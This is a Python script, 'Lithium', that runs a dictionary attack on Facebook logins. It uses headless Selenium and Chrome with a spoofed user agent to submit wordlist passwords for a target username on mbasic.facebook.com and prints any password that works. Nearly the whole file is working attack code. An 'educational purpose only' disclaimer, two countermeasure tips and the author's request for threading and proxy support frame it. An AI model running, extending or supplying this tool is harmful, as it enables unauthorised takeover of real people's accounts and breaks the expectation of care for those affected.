"""
 (L) Lithium V.01 : A simple selenium based facebook login cracker.

 Written By : Gaurav Giri
 Email : gaurovgiri@gmail.com
 facebook : (fb.com/girizgaurav)

 (I will try to provide threading and proxy support in upcomming versions of lithium, (help is appreciated).)

 About Script: Lithium uses dictionary based attack ie. trial and error method to guess correct password.
Hence, You need to provide a file containing all passwords which you think user may use .


 [!] Any Comment Or Suggestion Is Always Appreciated.


(WARNING) 
I'm not responsible for any harm (if caused ) by using this script, This script is written for educational purpose only.

(/WARNING)


Some courtmeasures to prevent dictionary based attacks like this :

 1. Use two way authentication for secure authentication
 2. Use passwords which are hard to guess or contain blended combination of alphanumeric and special characters.

*This script is designed to be used as an importable module, which will enable you to use integrate this script with your script.
"""
# we are using selenium for automation of login process on facebook.
from selenium import webdriver
from selenium.common.exceptions import WebDriverException
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from sys import exit
from time import sleep


class Lithium:
    def __init__(self, chromedriver):
        self.chromedriver = chromedriver
        self.user_agent = '--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, ' \
                          'like Gecko) Chrome/81.0.4044.92 Safari/537.36 '
        self.nodetails = 0
        self.option = Options()
        self.option.add_argument(self.user_agent)
        self.option.add_argument('--headless')  # on removing this line, every operation will be visible.
        self.option.add_argument('disable-extentions')

    def Inject(self):
        self.browser = webdriver.Chrome(self.chromedriver, options=self.option)
        self.browser.get("https://mbasic.facebook.com")  # basic html version of facebook is alot faster.
        try:
            with open(self.dictionaryfile, "r+") as dictionaryfile:
                self.passwords = dictionaryfile.readlines()
                for self.password in self.passwords:
                    self.password = self.password.replace("\n", "")
                    print("[attempt] username : %s password %s" % (self.username, self.password))
                    self.browser.find_element_by_name("email").clear()
                    username_element = self.browser.find_element_by_name("email")
                    password_element = self.browser.find_element_by_name("pass")
                    username_element.send_keys(self.username)
                    password_element.send_keys(self.password)
                    login_button = self.browser.find_element_by_name('login')
                    login_button.submit()
                    if "save" in self.browser.current_url or "?_rdr" in self.browser.current_url:
                        print("\n\n")
                        print("*************************************************************************************")
                        print("\t[success login found] username [%s] password [%s] " % (self.username, self.password))
                        print("*************************************************************************************")
                        self.passwordfound = 1
                        self.browser.close()
                        sleep(5)
                        break
                    elif "match any account" in self.browser.page_source:
                        print("\n[error] %s is not a valid username on facebook." % self.username)
                        self.browser.close()
                        sleep(5)
                        break
                    else:
                        pass
                if (self.passwordfound != 1):
                    print("[finish] dictionary file completed, no valid password found.")
                    sleep(2)
        except NoSuchElementException:
            print("\n1. Target account is temprory blocked due to multiple failed login attempts.")
            print("\n2. Something Went Wrong (for exact error : comment '--headless command line '( line 42) )")
            print("\n3. Internet Connection Not Available.")
            sleep(2)
            self.browser.close()
            exit(1)
        except WebDriverException:
            print("\n Unable to locate your chrome driver binary, please input correct address.")

        except AttributeError:  # to raise error if inject(action) is called before LoadDetails(getting necessary information)
            self.nodetails = 1
            print(
                "\n[error] please specify username and dictionary file using LoadDetails() before calling Inject ("
                "action function ).")
            sleep(2)
            sleep(2)
            exit(1)
        except WindowsError:
            print("\n[error] dictionary file (%s) not found." % self.dictionaryfile)
            self.browser.close()
            sleep(2)
            exit(1)
        except:
            pass

    def Details(self, username, dictionaryfile):
        if (self.nodetails == 1):
            exit(1)
        else:
            self.username = username
            self.dictionaryfile = dictionaryfile
